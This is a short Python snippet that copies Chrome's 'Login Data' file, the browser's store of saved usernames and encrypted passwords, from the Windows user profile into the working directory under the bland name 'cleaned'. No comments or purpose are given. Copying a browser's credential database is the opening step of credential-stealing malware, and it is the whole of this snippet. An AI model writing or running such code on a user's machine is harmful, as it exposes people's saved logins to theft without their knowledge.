import os
from shutil import copyfile

data_file = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
copy_file = os.getcwd() + '\cleaned'
copyfile(data_file, copy_file)
